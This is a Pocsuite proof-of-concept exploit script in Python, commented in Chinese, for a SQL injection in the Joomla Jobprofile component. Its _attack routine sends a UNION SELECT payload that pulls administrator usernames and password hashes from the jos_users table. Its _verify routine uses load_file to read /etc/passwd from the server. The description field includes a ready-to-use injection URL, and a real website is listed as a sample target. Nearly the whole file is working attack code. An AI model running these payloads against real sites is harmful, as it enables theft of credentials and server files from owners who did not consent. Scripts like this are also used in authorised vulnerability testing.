#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '72384'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2011-12-02'
    createDate = '2016-01-22'
    updateDate = '2016-01-22'
    references = ['http://www.seebug.org/vuldb/ssvid-72384']
    name = 'Joomla Jobprofile Component (com_jobprofile) - SQL Injection'
    appPowerLink = 'http://www.thakkertech.com/products/joomla-extensions/components/jobprofile-joomla-component-detail.html'
    appName = 'Joomla Jobprofile Component'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Joomla Jobprofile 组件 index.php 的参数id由于过滤不严，导致出现SQL注入漏洞。
        远程攻击者可以利用该漏洞执行SQL指令。

        利用该漏洞计算md5(1)的POC格式如下：

        http://XXX.com/index.php?option=com_jobprofile&Itemid=61&task=profilesview
        &id=-1+union+all+select+1,md5(1),3,4,5,6,7,8,9--

        下面的将分别利用注入漏洞读取joomla管理员口令密码，以及读取/etc/passwd文件的内容。
    '''
    samples = ['http://www.astellas.cz']

    def _attack(self):
        #利用SQL注入读取joomla管理员信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id='
        #利用Union方式读取信息
        payload="-1+union+all+select+1,concat(0x247e7e7e24,username,0x2a2a2a,password"\
        ",0x247e7e7e24),3,4,5,6,7,8,9+from+jos_users--"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if '$~~~$' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['AdminInfo']={}
                #用户名
                result['AdminInfo']['Username']=match.group(1)
                #密码
                result['AdminInfo']['Password']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #利用注入漏洞读取/etc/passwd的文件内容
        result = {}
        #文件名称
        filename='/etc/passwd'
        #进行16进制编码
        hexfilename='0x'+filename.encode('hex')
        #访问的地址
        exploit='/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id='
        #利用Union方式读取信息
        payload="-1+union+all+select+1,load_file("+hexfilename+"),3,4,5,6,7,8,9+from+jos_users--"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #判断返回结果
        if resp.status_code==200:
            match=re.search('root:.+?:0:0:.+?:.+?:.+?', resp.content,re.I|re.M)
            #读取文件成功
            if match:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url+exploit
                result['VerifyInfo']['Payload'] = payload
                #记录文件内容
                result['Fileinfo']={}
                result['Fileinfo']['Filename']=filename
                result['Fileinfo']['Content']=match.group(0)+'...'
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)